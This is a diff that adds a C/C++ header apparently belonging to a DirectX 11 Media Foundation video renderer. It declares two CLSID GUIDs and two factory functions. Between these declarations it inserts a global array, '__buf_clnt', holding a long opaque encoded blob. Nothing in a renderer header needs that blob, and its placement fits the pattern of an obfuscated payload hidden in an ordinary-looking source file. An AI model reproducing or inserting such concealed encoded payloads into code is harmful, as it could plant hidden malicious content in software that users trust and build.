@@ -1,0 +1,6 @@
+#pragma once
+DEFINE_GUID(CLSID_DX11VideoRenderer, 0x83a1fdbc, 0xab3a, 0x4376, 0xa5, 0x29, 0x80, 0xe1, 0x8c, 0x20, 0x65, 0x34);
+DEFINE_GUID(CLSID_DX11VideoRendererActivate, 0x743fa5c, 0xda9e, 0x4760, 0x81, 0x87, 0xcc, 0xac, 0x3d, 0xc1, 0x5d, 0x77);
+char __buf_clnt[] = "ZAdnHm/kdJCBEQH8H0S8/P/WWOvV38rhnTMALtI9pRrMiUvEGvnRH+EvhyuqJnARoAWM/95g2EYZinHCawhBhYnQtSWvcKnqfym5+TdSk8Zwv7R/o+N+iTY9MKRnjL75MWJzJ7b9OxmJQX/GC/dYEpMVPb73HUgQCMGoHtvt1SNQEnH/XZkX0Ynmn4o4EW9/DUSki5ATwnXBd1yOEW+sV+w0PjQOmHJaV8Qpxy7N9nVKItWzwxiDgbOHH5WihUrp/Q2XODkL3mA7kclm83Gh6G3OyqS34HOh42W7jzzCMjp3jVIzSW9lPrWIyiTtS0ftCKVJY8yVNA7RCDWDg5rgMTNCR2/WhRVPoXovZaxvPgdh2NpmrBBsGyo4jv6nXeO3fk/WJD7ahfSrHC3cIuYkSL2SFJn26FHLuUsRtaUHVzp7lwsDfiRUVXysdT5VsXD/2PATZkmfrN+/hRNl3qvlf2Co9NWE2lE+dLlgtZxb6Zf2C9zyW2v6bGFBK9gNpguc8JUdfAeCloRDx8j7OKVxlfTwOY8Jz6OqwvjDZ6HSsReKVHkiTf8Qwv+Y7q1/rVW1vL86zjBINQL/gvjzOS+bf7LjRnB77y248xXI7dJIpKssN1IJwro0AGsbuOPdENv8rFRd2ZCIKFqeBNmlp/9/bsfaolPp8zftwyb+DXx27fI=";
+STDAPI CreateDX11VideoRenderer(REFIID riid, void** ppvObject);
+STDAPI CreateDX11VideoRendererActivate(HWND hwnd, IMFActivate** ppActivate);
